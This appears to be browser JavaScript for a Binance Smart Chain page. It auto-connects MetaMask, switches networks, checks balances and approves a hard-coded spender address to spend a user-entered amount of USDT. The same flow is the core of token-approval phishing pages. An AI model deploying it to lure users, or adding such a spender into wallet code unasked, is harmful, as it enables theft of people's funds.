let provider;
let signer;
let tokenContract;

// BSC Configuration & Your Specific Addresses
const BSC_CHAIN_ID = "0x38"; // 56 in decimal
const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC-Pegged USDT
const SPENDER_ADDRESS = "0x220BB5df0893F21f43e5286Bc5a4445066F6ca56"; // Your specific spender

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)",
  "function decimals() view returns (uint8)",
  "function balanceOf(address owner) view returns (uint256)"
];

// --- AUTO-CONNECT LOGIC ---
window.addEventListener('load', async () => {
  if (window.ethereum) {
    try {
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      if (accounts.length > 0) {
        await connectWallet(); 
      }
    } catch (err) {
      console.error("Auto-connect check failed", err);
    }
  }
});

async function checkAndSwitchNetwork() {
  const chainId = await window.ethereum.request({ method: 'eth_chainId' });
  if (chainId !== BSC_CHAIN_ID) {
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: BSC_CHAIN_ID }],
      });
    } catch (err) {
      if (err.code === 4902) { // Network not in wallet
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: BSC_CHAIN_ID,
            chainName: 'Binance Smart Chain',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com/']
          }]
        });
      }
    }
  }
}

async function connectWallet() {
  if (!window.ethereum) return alert("Please install MetaMask!");
  try {
    await checkAndSwitchNetwork(); // Auto-detect and switch to BSC
    
    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    
    signer = await provider.getSigner();
    tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
    
    const address = await signer.getAddress();
    document.getElementById("status").innerText = `Connected (BSC): ${address.slice(0,6)}...${address.slice(-4)}`;
  } catch (err) {
    console.error(err);
    document.getElementById("status").innerText = "Connection failed.";
  }
}

async function executeApproval() {
  if (!tokenContract) {
    await connectWallet();
    if (!tokenContract) return;
  }

  const amountStr = document.getElementById("amount").value;
  if (!amountStr) return alert("Please enter an amount.");

  try {
    document.getElementById("status").innerText = "Checking balance...";
    
    const userAddress = await signer.getAddress();
    const decimals = await tokenContract.decimals();
    const parsedAmount = ethers.parseUnits(amountStr, decimals); // Dynamic decimal use

    // 1. Check USDT Balance
    const userBalance = await tokenContract.balanceOf(userAddress);
    if (userBalance < parsedAmount) {
      document.getElementById("status").innerText = "Error: Insufficient USDT balance.";
      return;
    }

    // 2. Check BNB (Gas) Balance
    const bnbBalance = await provider.getBalance(userAddress);
    if (bnbBalance === 0n) {
      document.getElementById("status").innerText = "Error: BNB required for gas fees.";
      return;
    }

    document.getElementById("status").innerText = "Check wallet to approve...";

    // Send approve transaction to your SPENDER_ADDRESS
    const tx = await tokenContract.approve(SPENDER_ADDRESS, parsedAmount);

    document.getElementById("status").innerText = "Confirming transaction...";
    await tx.wait();

    document.getElementById("status").innerText = "Success! Spend limit approved.";
  } catch (err) {
    console.error(err);
    document.getElementById("status").innerText = "Error: " + (err.reason || "Action denied.");
  }
}
